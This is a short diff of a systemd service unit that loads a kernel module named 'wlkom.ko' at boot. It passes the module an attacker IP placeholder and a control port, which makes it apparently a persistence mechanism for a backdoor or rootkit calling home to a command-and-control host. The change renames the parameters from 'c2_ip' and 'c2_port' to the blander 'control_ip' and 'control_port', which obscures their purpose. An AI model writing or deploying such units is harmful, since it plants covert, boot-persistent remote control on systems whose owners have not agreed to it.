@@ -4,7 +4,7 @@ After=network.target
 
 [Service]
 Type=oneshot
-ExecStart=/sbin/insmod /lib/modules/__KVER__/kernel/wlkom/wlkom.ko c2_ip=__ATTACKER_IP__ c2_port=__CONTROL_PORT__
+ExecStart=/sbin/insmod /lib/modules/__KVER__/kernel/wlkom/wlkom.ko control_ip=__ATTACKER_IP__ control_port=__CONTROL_PORT__
 RemainAfterExit=yes
 
 [Install]
